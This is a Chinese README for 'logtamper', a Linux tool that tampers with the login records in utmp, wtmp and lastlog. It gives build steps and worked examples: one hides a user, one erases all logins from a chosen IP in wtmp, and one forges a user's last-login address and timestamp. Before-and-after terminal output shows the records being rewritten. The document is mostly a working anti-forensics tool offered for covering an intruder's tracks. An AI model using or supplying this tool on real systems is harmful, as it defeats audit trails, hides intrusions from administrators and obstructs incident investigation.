logtamper是用c语言编写的操作linux日志的工具，
介绍请参考： https://starsl.cn/article/4839874604.html

# ./logtamper
Logtamper v 1.1 for linux
Copyright (C) 2008 by xi4oyu <evil.xi4oyu@gmail.com>

logtamper [-f utmp_filename] -h username hostname|ip               ## hide username connected from hostname
logtamper [-f wtmp_filename] -w username hostname|ip               ## erase username from hostname in wtmp file
logtamper [-f lastlog_filename] -m username hostname|ip ttyname YYYY[:MM[:DD[:hh[:mm[:ss]]]]]    ## modify lastlog info



编译：
下载本仓库代码，进入 bin/logtamper, 执行make命令，发现 生成一个  logtamper的 可执行文件。
./logtamper -h 可以查看帮助


# 修改/var/log/lastlog 文件中某用户的登录来源地址和时间
用法：
（1）修改/var/log/lastlog 文件中某用户的登录来源地址和时间。
lastlog 命令会读取该文件查看每个用户的最后一次登录信息， 也可以删除用户的登录信息，但是修改无法做到。
例如修改 用户 ansible 的最后一次登录时间和来源地址：
修改前：
```
[root@dev-app logtamper]# lastlog
Username         Port     From             Latest
root             pts/3    10.20.30.186     Thu Aug 15 02:06:33 +0000 2024
ansible          pts/1    10.20.30.187     Thu Aug 15 08:31:16 +0000 2024
```
修改：
```
[root@dev-app12 logtamper]# ./logtamper -m ansible 10.20.34.121 pts/2 2023:12:28:16:23:14
Logtamper v 1.1 for linux
Copyright (C) 2008 by xi4oyu <evil.xi4oyu@gmail.com>

Aho, now you never come here before...Check it out!
```
再用命令查看 lastlog
```
[root@dev-app12 logtamper]# lastlog
Username         Port     From             Latest
root             pts/3    10.20.30.186     Thu Aug 15 02:06:33 +0000 2024
ansible          pts/2    10.20.34.121     Thu Dec 28 16:23:14 +0000 2023
```



# 清除 wtmp 文件中你的登录日志
-w 选项:用于清除你的登录日志，现在上的linux日志清除工具做的很粗燥啊，这个可以指定清除某些hostname过来的机器。

[root@localhost logtamper]# last
root tty1 Wed Oct 1 21:30 - 21:30 (00:00)
root pts/4 192.168.80.1 Wed Oct 1 21:21 still logged in
root pts/3 192.168.80.1 Wed Oct 1 21:21 still logged in

wtmp begins Wed Oct 1 06:01:46 2008

清除192.168.80.1的登录日志：

[root@localhost logtamper]# ./logtamper -w root 192.168.80.1
Logtamper v 1.1 for linux
Copyright (C) 2008 by xi4oyu 

Aho,you are now invisible to last...Check it out!
[root@localhost logtamper]# last
root tty1 Wed Oct 1 21:30 - 21:30 (00:00)

wtmp begins Wed Oct 1 06:01:46 2008

#




